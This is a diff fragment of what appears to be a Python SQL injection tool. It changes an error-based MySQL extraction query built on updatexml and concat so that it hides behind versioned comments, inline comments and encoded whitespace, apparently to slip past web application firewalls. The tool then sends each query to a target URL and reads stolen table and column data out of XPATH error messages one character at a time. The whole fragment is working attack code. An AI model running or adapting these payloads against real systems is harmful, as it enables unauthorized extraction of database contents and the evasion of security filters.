@@ -51,7 +51,9 @@ def error_based(base_url,get_columns,table,num_rows):
                if(lend_n < int(actual_data_len)):
                     extracted_data = ""
                     for j in range(lend_n+1,data_n+1):
-                        query = f"{base_url} and updatexml(null,concat(0x3a,(concat((select left(right(concat(table_name,0x3a,column_name),{data_n+1}-{j}),1) from information_schema.columns limit  {row},1)))),null)--+-"
+                        query = f"{base_url} and /*!updatexml/**_**/*/(null,/*!concat/**_**/*/(0x3a,(/*!concat/**_**/*/((/*!00000select/**_**/*/ /*!left/**_**/*/(/*!right/**_**/*/(/*!concat/**_**/*/({obfuscated_columns}),{data_n+1}-{j}),1) from (%0C%09/*!00000{table}/**_**/*/%0C%09) limit  {row},1)))),null)--+-"
+                      
+                   
                         r = requests.get(query)
                         if "XPATH syntax" in r.text:
                             extracted_data = re.search(r"XPATH syntax error: &#039;:(.*?)&#039;|XPATH syntax error: ':(.*?)'", r.text)
